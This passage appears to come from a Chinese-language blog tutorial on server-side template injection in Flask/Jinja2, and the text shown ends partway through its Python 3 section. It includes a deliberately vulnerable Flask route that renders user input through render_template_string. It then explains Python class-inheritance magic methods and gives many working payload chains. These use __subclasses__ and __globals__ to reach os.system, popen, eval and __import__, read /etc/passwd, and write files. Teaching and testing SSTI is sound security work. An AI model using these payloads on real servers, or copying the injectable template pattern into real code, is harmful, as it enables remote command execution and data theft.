</span></span><span class=line><span class=cl>    <span class=nb>str</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;ben&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>html_str</span><span class=o>=</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>        &lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=s1>        &lt;head&gt;&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=s1>        &lt;body&gt;</span><span class=si>{0}</span><span class=s1>&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=s1>        &lt;/html&gt;
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=n>html_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                 
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>debug</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span><span class=s1>&#39;5000&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p><code>输入{{7*7}}会得到49</code></p><p>我们来实验一下。</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120083.jpeg title=d2779e97fd262471a6859cce82046297_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120083.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120083.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120083.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120083.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120083.jpeg 2x" sizes=auto alt=d2779e97fd262471a6859cce82046297_MD5></a></figure></p><p>实验成功</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120119.jpeg title=e3266b38e38bab65081fa022aab54df5_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120119.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120119.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120119.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120119.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120119.jpeg 2x" sizes=auto alt=e3266b38e38bab65081fa022aab54df5_MD5></a></figure></p><h3 id=继承关系 class=headerLink><a href=#%e7%bb%a7%e6%89%bf%e5%85%b3%e7%b3%bb class=header-mark></a>继承关系</h3><p>python，flask没有办法直接执行python指令。子类无法做到的事情先找到父类，再找到其他子类。</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120224.jpeg title=4df4d578b34b37add230df4f91f412e5_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120224.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120224.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120224.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120224.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120224.jpeg 2x" sizes=auto alt=4df4d578b34b37add230df4f91f412e5_MD5></a></figure></p><p>通过python代码，可知以下信息</p><p><strong>继承关系</strong></p><p>A是父类，B 是 A 的子类， C D 是 B 的子类</p><p>A<br>B</p><pre><code>	C

	D
</code></pre><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120188.jpeg title=4c8be70ecb721fa57bcd6cd3b7c96ede_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120188.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120188.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120188.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120188.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120188.jpeg 2x" sizes=auto alt=4c8be70ecb721fa57bcd6cd3b7c96ede_MD5></a></figure></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120274.jpeg title=f19d1b9ccfb8dd856cc69b451f673df9_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120274.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120274.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120274.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120274.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120274.jpeg 2x" sizes=auto alt=f19d1b9ccfb8dd856cc69b451f673df9_MD5></a></figure></p><h3 id=魔术方法 class=headerLink><a href=#%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95 class=header-mark></a>魔术方法</h3><pre tabindex=0><code>__class__     查找当前类型的所属对象

__base__     沿着父子类的关系往上走一个

__mro__     查找当前类对象的所有继承类

__subclasses__()     查找父类下的所有子类

__init__     查看类是否重载，重载是指程序在运行是就已经加载好了这个模块到内存中，如果出现**wrapper**字眼，说明没有重载

__globals__     函数会议字典的形式返回当前对象的全部全局变量(popen、eval)

__builtins__     用于查看当前所有导入的内建函数，当我们启动一个 python 解释器的时候，此时我们没有对任何变量或者函数进行声明，但我们依旧可以调用一些函数，这些函数即为内建函数

__import__     用于动态加载类和函数

__getitem__()     调用字典中的键值，其实就是调用这个魔术方法，比如`a[&#39;b&#39;]`，就是`a.__getitem__(&#39;b&#39;)`

__import__     动态加载类和函数，也就是导入模块，经常用于导入os模块，`__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]`

__dic__     类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的`__dict__`里

__getattribute__     实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性



object是父子关系的顶端，所有的数据类型最终的父类都是object

type是类型实例关系，所有对象都是type的实例

object和type既是类也是实例，因为object是type的一个实例，但是type又是object的子类，type自己创造了自己，object是type的父类，type创造了object
</code></pre><h3 id=常用过滤器 class=headerLink><a href=#%e5%b8%b8%e7%94%a8%e8%bf%87%e6%bb%a4%e5%99%a8 class=header-mark></a>常用过滤器</h3><pre tabindex=0><code>int()：将值转换为int类型；


float()：将值转换为float类型；


lower()：将字符串转换为小写；


upper()：将字符串转换为大写；


title()：把值中的每个单词的首字母都转成大写；


capitalize()：把变量值的首字母转成大写，其余字母转小写；


trim()：截取字符串前面和后面的空白字符；


wordcount()：计算一个长字符串中单词的个数；


reverse()：字符串反转；


replace(value,old,new)： 替换将old替换为new的字符串；


truncate(value,length=255,killwords=False)：截取length长度的字符串；


striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；


escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。


safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{&#39;&lt;em&gt;hello&lt;/em&gt;&#39;|safe}}；


list()：将变量列成列表；


string()：将变量转换成字符串；


join()：将一个序列中的参数值拼接成字符串。示例看上面payload；


abs()：返回一个数值的绝对值；


first()：返回一个序列的第一个元素；


last()：返回一个序列的最后一个元素；


format(value,arags,*kwargs)：格式化字符串。比如：{{ &#34;%s&#34; - &#34;%s&#34;|format(&#39;Hello?&#39;,&#34;Foo!&#34;) }}将输出：Helloo? - Foo!


length()/count()：返回一个序列或者字典的长度；


sum()：返回列表内数值的和；


sort()：返回排序后的列表；


default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
</code></pre><h2 id=基本知识 class=headerLink><a href=#%e5%9f%ba%e6%9c%ac%e7%9f%a5%e8%af%86 class=header-mark></a>基本知识</h2><p>学会自己查找利用点构造 payload</p><p>通过 object 查找所有子类</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__bases__</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=vm>__bases__</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>object</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
</span></span></code></pre></div><p><strong>这里的 <strong><code>**''**</code></strong> 可以替换成 <strong><code>**() {} []**</code></strong>, 但是继承链不一定一样, 需要改一下代码</strong></p><p>格式化输出, 方面查看索引位置</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()):</span> <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span></code></pre></div><p>获取某个子类所在命名空间的所有内容 (子类必须重载过 <code>__init__</code>)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=n>func_globals</span>
</span></span></code></pre></div><p>Python 2 两种方式都能用</p><p>Python 3 只能用 <code>__globals__</code></p><p>查找对应模块</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>search</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>,</span> <span class=s1>&#39;open&#39;</span><span class=p>,</span> <span class=s1>&#39;popen&#39;</span><span class=p>,</span> <span class=s1>&#39;linecache&#39;</span><span class=p>,</span> <span class=s1>&#39;__builtins__&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>index</span><span class=p>,</span> <span class=n>item</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>name</span> <span class=ow>in</span> <span class=n>search</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>name</span> <span class=ow>in</span> <span class=n>item</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>index</span><span class=p>,</span> <span class=n>item</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span></code></pre></div><h3 id=python-2 class=headerLink><a href=#python-2 class=header-mark></a>Python 2</h3><p>回显如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;linecache&#39;</span><span class=p>,</span> <span class=mi>59</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>warnings</span><span class=o>.</span><span class=n>WarningMessage</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>,</span> <span class=mi>59</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>warnings</span><span class=o>.</span><span class=n>WarningMessage</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;linecache&#39;</span><span class=p>,</span> <span class=mi>60</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>warnings</span><span class=o>.</span><span class=n>catch_warnings</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>,</span> <span class=mi>60</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>warnings</span><span class=o>.</span><span class=n>catch_warnings</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>,</span> <span class=mi>61</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_weakrefset</span><span class=o>.</span><span class=n>_IterationGuard</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>,</span> <span class=mi>62</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_weakrefset</span><span class=o>.</span><span class=n>WeakSet</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>,</span> <span class=mi>72</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>site</span><span class=o>.</span><span class=n>_Printer</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>,</span> <span class=mi>72</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>site</span><span class=o>.</span><span class=n>_Printer</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>site</span><span class=o>.</span><span class=n>Quitter</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>site</span><span class=o>.</span><span class=n>Quitter</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;open&#39;</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>IncrementalEncoder</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>IncrementalEncoder</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;open&#39;</span><span class=p>,</span> <span class=mi>79</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>IncrementalDecoder</span><span class=s1>&#39;&gt;)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>,</span> <span class=mi>79</span><span class=p>,</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>codecs</span><span class=o>.</span><span class=n>IncrementalDecoder</span><span class=s1>&#39;&gt;)</span>
</span></span></code></pre></div><p>通过 os 和 linecache 包执行命令</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># os</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>72</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>72</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>72</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>](</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>72</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;popen&#39;</span><span class=p>](</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># linecache</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;linecache&#39;</span><span class=p>]</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;linecache&#39;</span><span class=p>]</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span></code></pre></div><p>通过 <code>__builtins__</code> 读写文件, 导入模块, 执行代码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;file&#39;</span><span class=p>](</span><span class=s1>&#39;D:/test.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;open&#39;</span><span class=p>](</span><span class=s1>&#39;D:/test.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;file&#39;</span><span class=p>](</span><span class=s1>&#39;D:/a.txt&#39;</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s1>&#39;hello&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;open&#39;</span><span class=p>](</span><span class=s1>&#39;D:/a.txt&#39;</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s1>&#39;hello&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;__import__&#39;</span><span class=p>](</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;eval&#39;</span><span class=p>](</span><span class=s1>&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>另外, <strong>Python2 可以直接通过 <strong><code>**__subclasses__()**</code></strong> 下的 file 读写文件</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>40</span><span class=p>](</span><span class=s1>&#39;/etc/passwd&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=python-3 class=headerLink><a href=#python-3 class=header-mark></a>Python 3</h3><p>回显如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>100</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_frozen_importlib</span><span class=o>.</span><span class=n>_ModuleLock</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>101</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_frozen_importlib</span><span class=o>.</span><span class=n>_DummyModuleLock</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>102</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_frozen_importlib</span><span class=o>.</span><span class=n>_ModuleLockManager</span><span class=s1>&#39;&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=mi>103</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_frozen_importlib</span><span class=o>.</span><span class=n>ModuleSpec</span><span class=s1>&#39;&gt;</span>
